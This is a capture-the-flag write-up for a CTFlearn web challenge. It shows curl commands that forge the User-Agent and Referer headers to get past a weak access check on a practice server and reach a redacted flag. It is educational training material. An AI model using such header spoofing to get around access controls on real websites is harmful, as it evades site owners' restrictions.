### Don't Bump Your Head(er) 
https://ctflearn.com/challenge/109

## Decription
Try to bypass my security measure on this site! http://165.227.106.113/header.php

#  Solution
We need to bypass the security.Now let’s try to open the url given.

Curl is a great tool for transferring data from or to a server. It's also great to manipulate request headers. Manual page of curl can be found here. 
https://curl.se/docs/manpage.html

A curl request was done to the web page and got a response back as follow.
```console
    % curl http://165.227.106.113/header.php
    Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: curl/7.64.1
    <!-- Sup3rS3cr3tAg3nt  -->
```
So the curl command was constructed with a modified User-Agent as below.

    curl -H "User-Agent: Sup3rS3cr3tAg3nt" http://165.227.106.113/header.php 
    Sorry, it seems as if you did not just come from the site, "awesomesauce.com".
    <!-- Sup3rS3cr3tAg3nt  -->

The response above wanted the request traffic to be referred from a site called awesomesauce.com. So the curl command is further constructed to modify the referer in the header reqeust as below.

    % curl -e 'awesomesauce.com' -H "User-Agent: Sup3rS3cr3tAg3nt" http://165.227.106.113/header.php
    Here is your flag: flag{redacted}
    <!-- Sup3rS3cr3tAg3nt  -->
